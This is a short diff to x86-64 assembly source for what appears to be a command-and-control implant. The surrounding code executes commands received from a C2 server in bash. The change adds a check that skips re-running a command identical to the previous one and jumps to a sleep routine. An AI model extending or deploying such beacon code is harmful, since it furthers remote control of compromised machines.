@@ -735,6 +735,14 @@ _start:
     ; Execute command in bash
     call fn_exec_cmd
 
+    ; Compare the two commands
+    lea rdi, [cmd_buffer]
+    lea rsi, [cmd_buffer_old]
+    mov rdx, [cmd_buffer_length]
+    call fn_buffer_cmp 
+    test rax, rax
+    je .cleanup
+
     ; Store command into old command buffer, can compare afterwards
     lea rdi, [cmd_buffer_old]
     lea rsi, [cmd_buffer]
@@ -752,6 +760,7 @@ _start:
     ; Close connection to C2
     call fn_close_socket
 
+.cleanup:
     mov qword [sleep_time], 0x2         ; Sleep 2 seconds
     call fn_sleep
     mov qword [sleep_time], 0x0 
